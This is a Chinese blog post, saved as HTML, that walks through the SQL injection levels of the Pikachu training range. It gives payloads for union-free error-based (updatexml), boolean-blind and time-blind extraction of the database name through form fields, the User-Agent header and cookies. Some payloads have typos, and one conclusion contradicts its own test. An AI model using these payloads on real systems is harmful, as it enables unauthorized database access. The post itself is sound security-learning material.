<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>pikachu靶场之SQL注入 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="pikachu靶场之SQL注入" />
<meta property="og:description" content="0x00 前言 手工注入忘的差不多了。。。还是需要多多练习
以下关卡都是稍微测以下存不存在sql注入，查下数据库名啥的
没有将所有字段都爆出来。
冲鸭~
0x01 数字型注入(post) 因为是数字型，直接在后面加上真命题，不需要加单引号测试
0x02 字符型注入(get) 加单引号报错，说明存在sql注入
再加上真命题查询到all
0x03 搜索型注入 加单引号，sql语句报错
Payload:
li’ or 1=1 --&#43; 加上真命题回显all
Payload:
li&#39; and length(database())=7 --&#43; 测得数据库长度为7时正常回显
说明数据库长度为7
测数据库名
and ascii(substr(database(),x,1))=n X:库名第几位（1-7）
N:该位对应的ascii码值
对n进行爆破（65-122）
最后得到数据库名：pikachu
0x04 xx型注入 加单引号
0x05 insert/update注入 1.insert注入
测试模块：注册处
令用户名为quan’
Payload:
quan&#39; or updatexml(1,concat(0x7e,database()),0) or&#39; 2.Update注入
先登录进去，然后在修改资料处填写信息抓包
Payload:
quan&#39; or updatexml(1,concat(0x7e,database()),0) or&#39; 0x06 delete注入 先留言，点击删除时抓包
Payload：
62 or updatexml (1,concat(0x7e,datebase()),0) 在bp中Ctrl&#43;U 对payload进行url编码
0x07 http header注入 1." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/4ecead405640579d5b3a7176ba5c55d7/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2019-08-09T17:41:22+08:00" />
<meta property="article:modified_time" content="2019-08-09T17:41:22+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">pikachu靶场之SQL注入</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h4><a id="0x00__0"></a>0x00 前言</h4> 
<p>手工注入忘的差不多了。。。还是需要多多练习<br> 以下关卡都是稍微测以下存不存在sql注入，查下数据库名啥的<br> 没有将所有字段都爆出来。<br> 冲鸭~</p> 
<h4><a id="0x01_post_5"></a>0x01 数字型注入(post)</h4> 
<p>因为是数字型，直接在后面加上真命题，不需要加单引号测试<br> <img src="https://images2.imgbox.com/af/3c/Hb3F6kWq_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="0x02_get_8"></a>0x02 字符型注入(get)</h4> 
<p>加单引号报错，说明存在sql注入<br> <img src="https://images2.imgbox.com/dc/03/lAmEpUwv_o.png" alt="在这里插入图片描述"><br> 再加上真命题查询到all<br> <img src="https://images2.imgbox.com/05/1e/cIWsHA2S_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="0x03__13"></a>0x03 搜索型注入</h4> 
<p>加单引号，sql语句报错<br> Payload:</p> 
<pre><code>li’ or 1=1 --+
</code></pre> 
<p>加上真命题回显all<br> <img src="https://images2.imgbox.com/0d/c6/mMJqIO42_o.png" alt="在这里插入图片描述"><br> Payload:</p> 
<pre><code>li' and length(database())=7 --+
</code></pre> 
<p>测得数据库长度为7时正常回显<br> 说明数据库长度为7<br> <img src="https://images2.imgbox.com/cc/d6/UCyY8Hf2_o.png" alt="在这里插入图片描述"><br> 测数据库名</p> 
<pre><code>and ascii(substr(database(),x,1))=n
</code></pre> 
<p>X:库名第几位（1-7）<br> N:该位对应的ascii码值<br> 对n进行爆破（65-122）<br> <img src="https://images2.imgbox.com/22/dd/i1FNTddc_o.png" alt="在这里插入图片描述"><br> 最后得到数据库名：pikachu</p> 
<h4><a id="0x04_xx_37"></a>0x04 xx型注入</h4> 
<p>加单引号</p> 
<h4><a id="0x05_insertupdate_40"></a>0x05 insert/update注入</h4> 
<p><strong>1.insert注入</strong><br> 测试模块：注册处<br> 令用户名为quan’<br> <img src="https://images2.imgbox.com/f3/50/Lj0mXNW5_o.png" alt="在这里插入图片描述"><br> Payload:</p> 
<pre><code>quan' or updatexml(1,concat(0x7e,database()),0) or'
</code></pre> 
<p><img src="https://images2.imgbox.com/0f/4f/gSxGPt3W_o.png" alt="在这里插入图片描述"><br> <strong>2.Update注入</strong><br> 先登录进去，然后在修改资料处填写信息抓包<br> Payload:</p> 
<pre><code>quan' or updatexml(1,concat(0x7e,database()),0) or'
</code></pre> 
<p><img src="https://images2.imgbox.com/12/17/ci1UhuIR_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="0x06_delete_58"></a>0x06 delete注入</h4> 
<p>先留言，点击删除时抓包<br> <img src="https://images2.imgbox.com/ac/3b/lqp5lCmB_o.png" alt="在这里插入图片描述"><br> Payload：</p> 
<pre><code>62 or updatexml (1,concat(0x7e,datebase()),0)
</code></pre> 
<p>在bp中Ctrl+U 对payload进行url编码<br> <img src="https://images2.imgbox.com/1e/5f/QjnjGTIV_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="0x07_http_header_68"></a>0x07 http header注入</h4> 
<p><strong>1.UA头</strong><br> <img src="https://images2.imgbox.com/2d/ca/AiHfmPuB_o.png" alt="在这里插入图片描述"><br> Payload：</p> 
<pre><code>1' or updatexml (1,concat(0x7e,datebase()),0) or '
</code></pre> 
<p><img src="https://images2.imgbox.com/46/fd/VHtXTFV5_o.png" alt="在这里插入图片描述"><br> <strong>2.COOKIE</strong><br> cookie中的admin也是一个注入点<br> <img src="https://images2.imgbox.com/86/89/NGokkbUK_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="0x08_base_on_boolian_80"></a>0x08 盲注(base on boolian)</h4> 
<p>只有加<code>and 1=1#</code>才能返回个人信息，<code>or 1=1#</code>都报错：您输入的username不存在，请重新输入！<br> <img src="https://images2.imgbox.com/3e/f3/5g5thyP8_o.png" alt="在这里插入图片描述"><br> 利用and 1=1构造payload<br> Payload：</p> 
<pre><code>kobe' and ascii(substr(database(),1,1))=112#
</code></pre> 
<p><img src="https://images2.imgbox.com/92/e9/1tTDg5GO_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="0x09_base_on_time_90"></a>0x09 盲注(base on time)</h4> 
<p>payload:</p> 
<pre><code>kobe’ and sleep(5)#
</code></pre> 
<p><img src="https://images2.imgbox.com/4e/ee/W3Uf6fu5_o.png" alt="在这里插入图片描述"><br> 可以看到时间线是5s,说明存在基于时间的盲注<br> <img src="https://images2.imgbox.com/a0/6b/SQMuZtck_o.png" alt="在这里插入图片描述"><br> Payload：</p> 
<pre><code>kobe' and if ((substr(database(),1,1))='a',sleep=(5),null)#
</code></pre> 
<p>此时1ms就返回结果,说明数据库名第一位不是a<br> 将a改为p,则一直不返回结果<br> 说明数据库名第一位不是a</p> 
<h4><a id="0x10__106"></a>0x10 宽字节注入</h4> 
<p>emmmm还没写出来，下次吧<br> 先下班了，肥宅大哭?</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/345a67f33e2dd186563695d547a24008/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Arrays.asList()方法注意事项</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/33b4cd5db9c12f8c77e5135e3c11db64/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">MicroPhoneInput 自动判定音源录入&#43;百度音频录入的问题</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>